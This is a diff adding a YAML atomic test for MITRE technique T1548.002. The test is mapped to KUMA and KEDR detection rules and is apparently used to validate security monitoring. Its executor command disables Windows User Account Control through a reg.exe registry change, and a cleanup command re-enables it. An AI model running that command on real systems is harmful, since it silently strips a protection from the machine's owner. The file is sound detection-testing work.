@@ -1,0 +1,21 @@
+attack_technique: T1548.002
+display_name: Bypass User Account Control
+atomic_tests:
+- name: CUSTOM R085_Манипуляции с реестром (KATA)
+  kuma_rule: CUSTOM R085_Манипуляции с реестром (KATA) 
+  kuma_group: Registry Manipulation
+  kedr_rule: uac_policy_disable
+  kedr_rule_id: eeec1bc3-4565-2e9e-c2a9-706dfb4aa5ed
+  auto_generated_guid: d3d9af44-b8ad-4375-8b0a-4bff4b7e410c
+  description: |
+    Bypass User Account Control using Windows Registry
+    Change EnableLUA to 0                             
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      C:\Windows\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+    cleanup_command: |
+      C:\Windows\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
+    name: command_prompt
+    elevation_required: false
